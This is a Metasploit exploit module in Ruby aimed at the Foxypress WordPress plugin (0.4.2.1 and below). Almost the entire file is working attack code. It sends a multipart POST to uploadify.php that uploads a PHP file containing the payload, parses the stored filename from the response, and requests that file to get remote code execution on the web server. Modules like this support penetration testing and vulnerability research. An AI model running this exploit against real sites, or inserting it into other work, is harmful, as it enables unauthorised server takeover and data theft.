##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WordPress plugin Foxypress uploadify.php Arbitrary Code Execution',
			'Description'    => %q{
					This module exploits an arbitrary PHP code execution flaw in the WordPress
				blogging software plugin known as Foxypress. The vulnerability allows for arbitrary
				file upload and remote code execution via the uploadify.php script. The Foxypress
				plug-in versions 0.4.2.1 and below are vulnerable. 
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					#['CVE', ''],# ?
					['EDB', '18991'],
					['OSVDB', '82652'],
					['BID', '53805'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Space'       => 512,
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Jun 05 2012',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('URI', [true, "The full URI path to WordPress", "/"]),
			], self.class)
	end

	def exploit
		
		boundary = Rex::Text.rand_text_alphanumeric(8)
		data = "--#{boundary}\r\n"
		data << "Content-Disposition: form-data; name=\"Filedata\"; filename=\"#{rand_text_alphanumeric(6)}.php\"\r\n"
		data << "Content-Type: application\/octet-stream\r\n"
		data << "\r\n<?php #{payload.encoded} ?>\r\n"
		data << "--#{boundary}--\r\n"
		
		res = send_request_raw({
				'uri'      => datastore['URI'] + '/wp-content/plugins/foxypress/uploadify/uploadify.php',
				'method'   => 'POST',
				'data'     => data,
				'headers'  => {
						'Content-Length' => data.length,
						'Content-Type' => 'multipart/form-data; boundary=' + boundary,
					}
			})

		if (res and res.code == 200)
			print_status("The server returned: #{res.code} #{res.message}")
			if (res.body =~ /\{\"raw_file_name\"\:\"(\w+)\"\,/)
				print_good("Our payload is at: #{$1}.php! Calling payload...")
				res = send_request_raw({ 'uri' => datastore['URI'] + "/wp-content/affiliate_images/#{$1}.php"})
			end
		else
			print_status("No response from the server")
		end
	end

end
